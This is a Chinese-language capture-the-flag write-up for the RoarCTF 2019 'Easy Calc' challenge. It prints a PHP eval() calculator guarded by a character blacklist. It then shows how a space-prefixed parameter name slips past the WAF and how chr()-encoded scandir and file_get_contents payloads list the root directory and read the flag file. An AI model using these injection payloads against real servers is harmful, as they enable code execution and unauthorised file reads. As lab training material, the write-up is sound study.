# T2 WAF

> 题目： [RoarCTF 2019]Easy Calc

__0x00 审题___

1. 打开网页，是一个计算器，随意输入算式得到结果（尝试输入字符，发现回显错误）
2. 查看源码，如下
```html
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```
> 发现存在问题：1.什么是WAF 2.存在calc.php

3. 打开calc.php，看到代码如下

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

__0x01 解题__

* 代码审计：

1. 利用get方法对变量num进行传参
> 尝试：payload--?num=2*3 返回6，如果num为字符返回被过滤
2. 为何会被forbidden：搜索waf

> waf：WAF（Web 应用程序防火墙）通过过滤和监控 Web 应用程序与互联网之间的 HTTP 流量来帮助保护 Web 应用程序。它通常可以保护 Web 应用程序，使其免受跨站点伪造、跨站点脚本 (XSS)、文件包含、SQL 注入及其他一些攻击的影响

WAF 是防火墙那么可见输入字母是不没允许的，接下来要解决两个问题：

```
1. 绕过WAF
2. 绕过黑名单
```

> 问题一：如何绕过WAF（[某些参考](https://blog.csdn.net/qq_53079406/article/details/123147690)）
> 大小写混合，使用编码，使用注释，使用空字节

```
?%20num=...
```

> 问题二：绕过黑名单
> 黑名单存在即为有用，为什么我感觉用不上，他过滤了“/”，难道要我扫描根目录？
> > 追加问题三:如何利用传参查看根目录

很显然面对这个问题我不知道如何操作（[亿点借鉴](https://blog.csdn.net/weixin_54648419/article/details/123690383)）

_指出其中scandir官网定义：成功则返回包含有文件名的 array，如果失败则返回 false。如果 directory 不是个目录，则返回布尔值 false 并生成一条 E_WARNING 级的错误。参数：要被浏览的目录_

> var_dump — 打印变量的相关信息 已经提及，用于打印一个变量的信息

```
calc.php?%20num=var_dump(scandir(chr(47)))//chr(47)-->/
```

GET：
```
array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" } 
```

找到“flagg”

> 问题四：如何导出（感觉这个问题太蠢了，但确实是个问题）
> 
```
 calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
//file_get_contents() 把整个文件读入一个字符串中。
```

__0x02 答案__

```
flag=flag{c3da6753-a99b-43f6-a591-1163cf1cc585} 
```

__0x03 总结__

1. 为什么明明是GET传参却可以得到文件内容，看来只要可以传参的可操作性就很强
2. 一些曾经见过的函数没有印象，想不起来，导致拆分出问题无从下手
3. 熟练度有待加强
